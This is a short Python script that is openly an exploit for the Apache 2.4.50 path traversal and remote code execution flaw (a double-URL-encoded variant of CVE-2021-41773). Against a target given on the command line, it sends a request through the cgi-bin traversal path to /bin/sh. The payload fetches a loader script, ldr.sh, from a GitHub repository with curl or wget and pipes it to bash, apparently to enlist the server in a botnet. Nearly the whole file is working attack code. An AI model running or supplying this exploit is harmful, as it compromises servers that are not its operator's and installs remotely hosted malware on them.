from subprocess import getoutput
import sys

# Apache 2.4.50 path traversal and remote code execution if mod_cgi is enabled, this is the same as CVE-2021-41773 except we use double url encoding

def main():
    payloads = [
        ("LPRS", f"-d 'echo Content-Type: text/plain; echo; (curl -kL https://github.com/proxin187/lapras/raw/refs/heads/main/ldr.sh || wget -q --no-check-certificate -O- https://github.com/proxin187/lapras/raw/refs/heads/main/ldr.sh ) | bash & echo LPRS' \"{sys.argv[1]}/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh\""),
    ]

    for (match, payload) in payloads:
        if match in getoutput(f"curl -m 4 -s --path-as-is {payload}"):
            exit(0)

    exit(1)

if __name__ == "__main__":
    main()


